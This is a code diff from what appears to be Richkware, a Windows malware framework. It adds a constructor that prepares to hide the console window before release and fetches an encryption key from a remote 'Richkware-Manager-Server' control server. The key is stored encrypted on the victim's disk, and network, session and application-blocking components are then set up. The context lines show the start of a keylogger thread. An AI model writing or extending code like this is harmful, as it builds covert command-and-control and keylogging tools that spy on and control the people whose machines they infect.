@@ -204,6 +204,45 @@ Richkware::Richkware(const char *AppNameArg, const std::string &defaultEncryptio
     blockApps = BlockApps();
 }
 
+Richkware::Richkware(const char *AppNameArg, RMSinfo rmSinfo) {
+    appName = AppNameArg;
+    // TODO RELEASE UNCOMMENT before release
+    // Hide console
+    //ShowWindow(GetConsoleWindow(), 0);
+    systemStorage = SystemStorage(AppNameArg);
+
+    // **encryptionKey**: check presence of encryption key in the system
+    Crypto crypto(rmSinfo.defaultEncryptionKey);
+    std::string encKey = systemStorage.LoadValueFromFile(appName + "_encKey.richk");
+
+    if (encKey.empty()) {
+        // Key Exchange with Richkware-Manager-Server, using defaultEncryptionKey.
+        //OLD Network network1(defaultEncryptionKey);
+        //OLD encKey = network1.GetEncryptionKeyFromRMS(serverAddress, port, associatedUser);
+        encKey = Network::GetEncryptionKeyFromRMS(rmSinfo.serverAddress, rmSinfo.port, rmSinfo.associatedUser, rmSinfo.defaultEncryptionKey);
+
+        if (encKey.empty() || (encKey.compare("Error") == 0)) {
+            // Key Exchange failed
+            encryptionKey = rmSinfo.defaultEncryptionKey;
+        } else {
+            // Key Exchange succeed
+            encryptionKey = encKey;
+            // save the encryption key(obtained from the RMS), encrypted with default password
+            encKey = crypto.Encrypt(encKey);
+            systemStorage.SaveValueToFile(appName + "_encKey.richk", encKey);
+        }
+    } else {
+        // Encryption Key already present
+        encKey = crypto.Decrypt(encKey);
+        encryptionKey = encKey;
+    }
+
+    network = Network(rmSinfo.serverAddress, rmSinfo.port, rmSinfo.associatedUser, encryptionKey);
+    session = Session(encryptionKey, AppNameArg);
+    blockApps = BlockApps();
+}
+
+
 DWORD WINAPI KeyloggerThread(void *arg) {
     const char *nomeFile = (const char *) arg;
     char tmp_path[MAX_PATH];
